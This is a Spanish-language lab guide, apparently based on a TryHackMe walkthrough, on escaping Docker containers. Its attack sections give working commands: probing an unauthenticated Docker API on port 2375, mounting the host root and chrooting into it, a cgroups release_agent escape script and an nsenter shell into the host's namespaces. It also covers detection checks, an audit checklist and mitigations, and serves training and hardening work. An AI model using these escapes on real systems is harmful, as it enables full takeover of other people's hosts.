
# Guía: Escapes comunes en contenedores Docker y explotación de Docker Engine (TCP + cgroups + nsenter)

**Resumen**  
Esta guía reúne los vulnerabilidades y exploits descritos en tu material y muestra PoC reproducibles, técnicas de enumeración, comprobaciones y recomendaciones de mitigación. Está pensada para uso en laboratorios/entornos de práctica (p. ej. TryHackMe). Usa con responsabilidad y solo en entornos con permiso.

---

## Objetivos de aprendizaje
- Entender vulnerabilidades comunes en contenedores Docker (capabilities, cgroups, docker.sock, sockets TCP, namespaces).
- Aprender a enumerar y explotar un Docker Engine expuesto por TCP (puerto 2375).
- Reproducir PoC de escape con **cgroups (release_agent)** y con **nsenter**.
- Conocer detección, mitigación y checklist de auditoría.

---

## Requisitos
- Haber completado un **Intro a Docker** y saber usar la CLI de Linux.
- Acceso root dentro del contenedor (la mayoría de los escapes requieren privilegios dentro del contenedor).
- Entorno de laboratorio (máquinas virtuales, TryHackMe, etc.).

---

## 1) Puerto por defecto del Docker Engine
- **2375/tcp** (sin TLS) — exposición remota insegura.  
- Nota: Docker también puede escuchas en 2376 con TLS configurado.

---

## 2) Enumeración: detectar Docker expuesto por TCP
Ejemplo con `nmap`:
```bash
nmap -sV -p 2375 10.10.69.101
```

Comprobación simple con `curl`:
```bash
curl http://10.10.69.101:2375/version
```

Si responde con JSON, el demonio Docker está accesible y puedes ejecutar comandos remotos.

---

## 3) Interactuar con un Docker remoto desde tu máquina
Usar el cliente Docker local apuntando al servidor remoto:
```bash
docker -H tcp://10.10.69.101:2375 ps
```

Operaciones útiles (desde el atacante):
- `docker -H tcp://HOST:2375 ps` — listar contenedores.
- `docker -H tcp://HOST:2375 images` — listar imágenes.
- `docker -H tcp://HOST:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh` — montar el filesystem del host y chroot (si se dispone de imagen).
- `docker -H tcp://HOST:2375 exec -it <container> /bin/sh` — ejecutar comandos dentro de contenedor.

**Riesgo**: acceso total para crear/ejecutar/leer archivos del host si se abusa de `-v /:/mnt`.

---

## 4) Exploit: Montar el filesystem del host usando docker.sock / docker TCP
**Descripción**: crear un contenedor que monte `/` del host en el contenedor y usar `chroot` para "convertir" ese montaje en la raíz — así obtienes acceso al host.

Comando (PoC):
```bash
# si docker daemon remoto es accesible con docker client
docker -H tcp://10.10.69.101:2375 run -v /:/mnt --rm -it alpine sh -c "chroot /mnt sh"
```
Explicación:
- `-v /:/mnt` monta la raíz del host en `/mnt` dentro del contenedor.
- `chroot /mnt sh` cambia el root del shell al filesystem del host.

**Notas prácticas**:
- Si la imagen no existe en el host remoto, Docker intentará descargarla desde un registro — ese comportamiento puede delatar el ataque.
- En algunos hosts puede faltar `chroot` en imágenes muy pequeñas; usar `--privileged` o imágenes más completas si tienes control.

---

## 5) Exploit: cgroups `release_agent` (PoC resumido)
**Qué aprovecha**: capacidades del contenedor (p. ej. `CAP_SYS_ADMIN`, `CAP_MKNOD`) y la posibilidad de montar `cgroup` para configurar `release_agent`, que ejecuta un script cuando se libera el cgroup.

**Pasos (resumen, ejecutar **solo** en entornos controlados)**:
```bash
# 1. Crear punto de montaje de cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# 2. Habilitar ejecución al liberar el cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. Obtener la ruta del directorio del host donde están los contenedores
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# 4. Indicar dónde estará el release_agent (ejecutable que se invocará en host)
echo "$host_path/exploit" > /tmp/cgrp/release_agent

# 5. Crear el script exploit (ej: copiar flag del host a ruta visible)
cat > /exploit <<'EOF'
#!/bin/sh
cat /root/host_flag.txt > $host_path/flag.txt
EOF
chmod +x /exploit

# 6. Poner un proceso en el cgroup (esto desencadenará la ejecución cuando el cgroup sea liberado)
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**Resultado**: cuando el kernel libere el cgroup, ejecutará `/exploit` en el contexto del host (dependiendo de la configuración), permitiendo ejecutar comandos con privilegios del host.

**Advertencias**:
- Cambios en sintaxis de `/etc/mtab` y paths pueden requerir ajuste.
- Este vector requiere capacidades elevadas del contenedor (p. ej. ejecución en modo privilegiado o capacidades `CAP_SYS_ADMIN` entre otras).
- No funcionar en kernels modernos con mitigaciones/deshabilitación de `release_agent`.

---

## 6) Exploit: Namespaces y `nsenter` (si el contenedor puede ver procesos del host)
**Descripción**: si el contenedor comparte (o puede ver) el PID 1 del host (systemd/init), usar `nsenter` para entrar en los namespaces del host y ejecutar un shell en contexto del host.

Requisitos:
- `nsenter` instalado en el contenedor.
- Acceso a los namespaces objetivo (visibilidad del PID 1).
- Normalmente se requiere que el contenedor tenga permisos para leer `/proc` del host (p. ej. cuando `/proc` no está aislado).

PoC:
```bash
# Ejecutar dentro del contenedor como root
nsenter --target 1 --mount --uts --ipc --net --pid /bin/bash
```

Explicación rápida:
- `--target 1` → usar namespaces del proceso con PID 1 (host).
- `--mount --uts --ipc --net --pid` → entrar en mount, UTS, IPC, network y PID namespaces.
- La shell resultante se ejecuta en el contexto del host (hostname cambia, acceso a recursos del host).

**Nota**: en sistemas con `userns` u otras restricciones esto puede fallar.

---

## 7) Detección y verificaciones desde dentro del contenedor
- `ps aux` — si hay **muchos** procesos (y PID 1 no es el típico de contenedor), puede indicar que se ven procesos del host.
- `ls -la /var/run | grep docker.sock` — buscar docker.sock montado.
- `mount` / `cat /proc/1/mounts` — ver mounts y cgroups.
- `capsh --print` (si instalado) — listar capacidades del proceso/entorno.
- `groups` — ver si el usuario pertenece al grupo `docker`.

---

## 8) Checklist de auditoría (rápida)
- ¿El daemon Docker está escuchando en una interfaz pública sin TLS? (c. 2375) → **No**.
- Si escucha remoto: ¿está protegido con TLS y autenticación mútua? → **Sí** preferible.
- ¿Hay sockets docker.sock montados en contenedores? → Evitar.
- ¿Contenedores corren con `--privileged`? → Evitar.
- ¿Se montan volúmenes sensibles (`-v /:/`, `/var/run/docker.sock`)? → Evitar o restringir.
- ¿Capacities asignadas innecesarias (`CAP_SYS_ADMIN`, `CAP_SYS_MODULE`, `CAP_SYS_CHROOT`)? → Minimizar.
- ¿user namespaces habilitados? → Usarlos, reduce riesgo de UID 0 dentro del host.
- ¿SELinux/AppArmor configurados y enforcing? → Sí, configurar perfiles.
- ¿Registros de auditoría (auditd) y monitoreo de cambios en imágenes/containers? → Implementar.

---

## 9) Mitigaciones recomendadas
- No exponer Docker API por TCP sin TLS y autenticación mútua.
- Usar `docker context` o proxys con autenticación si se necesita acceso remoto.
- No montar `docker.sock` dentro de contenedores. Si es imprescindible, limitarlo a contenedores de confianza y con controles adicionales.
- Evitar `--privileged`. Asignar sólo las capacidades necesarias.
- Habilitar user namespaces (`userns-remap`), AppArmor/SELinux, y políticas de Linux seccomp.
- Escanear imágenes y usar registries privados con firmas.
- Monitorizar comportamientos inusuales (nuevas imágenes, descargas de imágenes, contenedores que ejecutan comandos `chroot` o montan `/`).
- Harden host: minimizar usuarios, parches al kernel y al daemon Docker.

---

## 10) Plantilla mínima de informe (para GitHub / entrega)
```
# Hallazgos - Escapes Docker (Resumen)

- Fecha: YYYY-MM-DD
- Objetivo: <IP/hostname>
- Vector(s) identificado(s):
  - Docker Daemon escuchando en 2375/tcp sin TLS.
  - Contenedor(s) con /var/run/docker.sock montado.
  - Contenedor(s) corriendo en modo privileged.
- Pruebas realizadas:
  - nmap -sV -p 2375 <IP>
  - curl http://<IP>:2375/version
  - docker -H tcp://<IP>:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
- Evidencias:
  - Salida de curl / docker ps / archivos copiados.
- Riesgo: Alta — ejecución remota y acceso al host.
- Recomendaciones:
  - No exponer 2375 sin TLS.
  - Revocar contenedores privileged.
  - Remover montados de /var/run/docker.sock.
  - Implementar autenticación, userns, AppArmor/SELinux.
```

---

## 11) Recursos y lecturas
- Trail of Bits - `cgroup` release_agent research (PoC conocidos).  
- Documentación oficial Docker sobre `daemon` TLS, `dockerd` flags y buenas prácticas.  
- Medium write-up (ejemplo): `https://medium.com/@DevSec0ps/container-vulnerabilities-tryhackme-thm-write-up-walkthrough-2525d0ecfbfd` (referencia que proporcionaste).

---

## 12) Notas finales y responsabilidad
Usa esta guía únicamente en entornos controlados o con autorización. Las técnicas descritas pueden comprometer sistemas; su uso no autorizado es ilegal y poco ético.

---

*Fin de la guía*
